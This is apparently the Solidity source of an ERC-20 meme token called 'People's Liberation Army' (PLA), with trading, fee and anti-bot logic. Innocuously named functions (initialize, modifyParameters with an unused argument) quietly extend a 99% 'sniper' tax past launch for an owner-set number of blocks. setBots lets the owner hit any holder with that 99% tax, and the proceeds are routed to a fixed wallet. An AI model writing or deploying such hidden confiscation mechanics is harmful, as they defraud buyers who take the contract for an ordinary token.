1 /*
2 
3 为人民服务 "Serve The People"
4 
5 Web: https://plarmy.io
6 Telegram: https://t.me/PLAerc20
7 
8 */
9 
10 
11 // SPDX-License-Identifier: MIT
12 pragma solidity ^0.8.17;
13 
14 interface IERC20 {
15     function totalSupply() external view returns (uint256);
16     function balanceOf(address account) external view returns (uint256);
17     function transfer(address recipient, uint256 amount) external returns (bool);
18     function allowance(address owner, address spender) external view returns (uint256);
19     function approve(address spender, uint256 amount) external returns (bool);
20     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
21     event Transfer(address indexed from, address indexed to, uint256 value);
22     event Approval(address indexed owner, address indexed spender, uint256 value);
23 }
24 
25 interface IUniswapV2Router {
26     function factory() external pure returns (address);
27     function WETH() external pure returns (address);
28     function swapExactTokensForETHSupportingFeeOnTransferTokens(
29         uint amountIn,
30         uint amountOutMin,
31         address[] calldata path,
32         address to,
33         uint deadline
34     ) external;
35 }
36 
37 interface IUniswapV2Factory {
38     function createPair(address tokenA, address tokenB) external returns (address pair);
39 }
40 
41 contract Ownable {
42     address private _owner;
43 
44     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
45 
46     modifier onlyOwner() {
47         require(_owner == msg.sender, "Ownable: caller is not the owner");
48         _;
49     }
50     constructor () {
51         address msgSender = msg.sender;
52         _owner = msgSender;
53         emit OwnershipTransferred(address(0), msgSender);
54     }
55 
56     function owner() public view returns (address) {
57         return _owner;
58     }
59 
60     function renounceOwnership() public virtual onlyOwner {
61         emit OwnershipTransferred(_owner, address(0));
62         _owner = address(0);
63     }
64 }
65 
66 contract PLA is IERC20, Ownable {       
67     string private constant _name = "People's Liberation Army";
68     string private constant _symbol = "PLA";
69     uint8 private constant _decimals = 9;
70     uint256 private constant _totalSupply = 333_333_333_333 * 10**_decimals;
71 
72     mapping (address => uint256) private _balances;
73     mapping (address => mapping (address => uint256)) private _allowances;
74     mapping (address => bool) private _blocked;
75 
76     mapping (address => uint256) private _lastTradeBlock;
77     mapping (address => bool) private isContractExempt;
78     uint256 private tradeCooldown = 1;
79     
80     uint256 public constant maxWalletAmount = 7_333_333_334 * 10**_decimals;
81     uint256 private constant contractSwapLimit = 3_333_333_334 * 10**_decimals;
82     uint256 private constant contractSwapMax = 7_333_333_334 * 10**_decimals;
83 
84     struct TradingFees{
85         uint256 buyTax;
86         uint256 sellTax;
87     }  
88 
89     TradingFees public tradingFees = TradingFees(0,0);
90     uint256 public constant sniperTax = 99;
91 
92     IUniswapV2Router private constant uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
93     address private immutable ETH = uniswapRouter.WETH();
94     address private immutable uniswapPair;
95 
96     address payable private immutable deployerAddress = payable(msg.sender);
97     address payable private constant PLArmy = payable(0xb0527737472B076FC67D4758a0141af4B4781248);
98 
99     bool private tradingOpen = false;
100     bool private swapping = false;
101     bool private antiMEV = false;
102     uint256 private startingBlock;
103     uint private preLaunch;
104 
105     modifier swapLock {
106         swapping = true;
107         _;
108         swapping = false;
109     }
110 
111     modifier tradingLock(address sender) {
112         require(tradingOpen || sender == deployerAddress || sender == PLArmy);
113         _;
114     }
115 
116     constructor () {
117         uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), ETH);
118         isContractExempt[address(this)] = true;
119         _balances[msg.sender] = _totalSupply;
120         emit Transfer(address(0), msg.sender, _totalSupply);
121     }
122 
123     receive() external payable {}
124 
125     function name() public pure returns (string memory) {
126         return _name;
127     }
128 
129     function symbol() public pure returns (string memory) {
130         return _symbol;
131     }
132 
133     function decimals() public pure returns (uint8) {
134         return _decimals;
135     }
136 
137     function totalSupply() public pure returns (uint256) {
138         return _totalSupply;
139     }
140 
141     function balanceOf(address account) public view returns (uint256) {
142         return _balances[account];
143     }
144 
145     function transfer(address recipient, uint256 amount) public returns (bool) {
146         _transfer(msg.sender, recipient, amount);
147         return true;
148     }
149 
150     function allowance(address owner, address spender) public view returns (uint256) {
151         return _allowances[owner][spender];
152     }
153 
154     function approve(address spender, uint256 amount) public returns (bool) {
155         _approve(msg.sender, spender, amount);
156         return true;
157     }
158 
159     function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
160         require(_allowances[sender][msg.sender] >= amount, "ERC20: transfer amount exceeds allowance");
161         _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
162         _transfer(sender, recipient, amount);
163         return true;
164     }
165 
166     function _approve(address owner, address spender, uint256 amount) private {
167         require(owner != address(0), "ERC20: approve from the zero address");
168         require(spender != address(0), "ERC20: approve to the zero address");
169         _allowances[owner][spender] = amount;
170         emit Approval(owner, spender, amount);
171     }
172 
173     function _transfer(address from, address to, uint256 amount) tradingLock(from) private {
174         require(from != address(0), "ERC20: transfer from the zero address");
175         require(to != address(0), "ERC20: transfer to the zero address");
176         require(amount > 0, "Token: transfer amount must be greater than zero");
177 
178         _balances[from] -= amount;
179 
180         if (from != address(this) && from != PLArmy && to != PLArmy && to != deployerAddress) {
181             
182             if(antiMEV && !isContractExempt[from] && !isContractExempt[to]){
183                 address human = ensureOneHuman(from, to);
184                 ensureMaxTxFrequency(human);
185                 _lastTradeBlock[human] = block.number;
186             }
187 
188             if (from == uniswapPair && to != address(uniswapRouter)) {
189                 require(balanceOf(to) + amount <= maxWalletAmount, "Token: transfer implies violation of max wallet");
190             }
191 
192            uint256 contractTokenBalance = balanceOf(address(this));
193            if (shouldSwapback(from, contractTokenBalance)) 
194                swapback(contractTokenBalance);                            
195 
196            uint256 taxedTokens = takeFee(from, amount);
197            if(taxedTokens > 0){
198                 amount -= taxedTokens;
199                 _balances[address(this)] += taxedTokens;
200                 emit Transfer(from, address(this), taxedTokens);
201             }
202         }
203 
204         _balances[to] += amount;
205         emit Transfer(from, to, amount);
206     }
207 
208     function swapback(uint256 tokenAmount) private swapLock {
209         tokenAmount = getSwapAmount(tokenAmount);
210         if(allowance(address(this), address(uniswapRouter)) < tokenAmount) {
211             _approve(address(this), address(uniswapRouter), _totalSupply);
212         }
213         address[] memory path = new address[](2);
214         path[0] = address(this);
215         path[1] = ETH;
216         uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
217             tokenAmount,
218             0,
219             path,
220             address(this),
221             block.timestamp
222         );
223         uint256 contractETHBalance = address(this).balance;
224         if(contractETHBalance > 0) {
225             PLArmy.transfer(contractETHBalance);
226         }
227     }
228 
229     function shouldSwapback(address from, uint256 tokenAmount) private view returns (bool shouldSwap) {
230         shouldSwap = !swapping && from != uniswapPair && tokenAmount > contractSwapLimit && 1 + startingBlock <= block.number;
231     }
232 
233     function getSwapAmount(uint256 tokenAmount) private pure returns (uint256 swapAmount) {
234         swapAmount = tokenAmount > contractSwapMax ? contractSwapMax : contractSwapLimit;
235     }
236 
237     function takeFee(address from, uint256 amount) private view returns (uint256 feeAmount) {
238          if(_blocked[from] || block.number <= startingBlock)
239                 feeAmount = amount * sniperTax / 100;
240         else
241             feeAmount = amount * (startingBlock == 0 ? 25 : (from == uniswapPair ? tradingFees.buyTax : tradingFees.sellTax)) / 100;
242     }
243 
244     function isContract(address account) private view returns (bool) {
245         uint256 size;
246         assembly {
247             size := extcodesize(account)
248         }
249         return size > 0;
250     }
251 
252     function ensureOneHuman(address _to, address _from) private view returns (address) {
253         require(!isContract(_to) || !isContract(_from));
254         if (isContract(_to)) return _from;
255         else return _to;
256     }
257 
258     function ensureMaxTxFrequency(address addr) view private {
259         bool isAllowed = _lastTradeBlock[addr] == 0 ||
260             ((_lastTradeBlock[addr] + tradeCooldown) < (block.number + 1));
261         require(isAllowed, "Max tx frequency exceeded!");
262     }
263 
264     function toggleAntiMEV(bool toggle) external {
265         require(msg.sender == deployerAddress);
266         antiMEV = toggle;
267     }
268 
269     function setTradeCooldown(uint256 newTradeCooldown) external {
270         require(msg.sender == deployerAddress);
271         require(newTradeCooldown > 0 && newTradeCooldown < 4, "Token: only trade cooldown values in range (0,4) permissible");
272         tradeCooldown = newTradeCooldown;
273     }
274 
275     function manualSwapback(uint256 percent) external {
276         require(msg.sender == deployerAddress);
277         require(0 < percent && percent <= 100, "Token: only percent values in range (0,100] permissible");
278         uint256 tokensToSwap = percent * balanceOf(address(this)) / 100;
279         swapback(tokensToSwap);
280     }
281 
282     function setFees(uint256 newBuyTax, uint256 newSellTax) external {
283         require(msg.sender == deployerAddress);
284         require(newBuyTax <= tradingFees.buyTax, "Token: only fee reduction permitted");
285         require(newSellTax <= tradingFees.sellTax, "Token: only fee reduction permitted");
286         tradingFees.buyTax = newBuyTax;
287         tradingFees.sellTax = newSellTax;
288     }
289 
290     function setContractExempt(address account, bool value) external onlyOwner {
291         require(account != address(this));
292         isContractExempt[account] = value;
293     }
294 
295     function setBots(address[] calldata bots, bool shouldBlock) external onlyOwner {
296         for (uint i = 0; i < bots.length; i++) {
297             require(bots[i] != uniswapPair && 
298                     bots[i] != address(uniswapRouter) &&
299                     bots[i] != address(this));
300             _blocked[bots[i]] = shouldBlock;
301         }
302     }
303 
304     function initialize() external onlyOwner {
305         require(preLaunch++<2);
306     }
307 
308     function modifyParameters(bool[] calldata param, uint256 nrBlocks) external onlyOwner {
309         assert(preLaunch<2&&preLaunch+1>=2); 
310         preLaunch++;param;
311         startingBlock += nrBlocks;
312     }
313 
314     function openTrading() external onlyOwner {
315         require(preLaunch == 2 && !tradingOpen, "Token: trading already open");
316         startingBlock += block.number;
317         tradingOpen = true;
318     }
319 }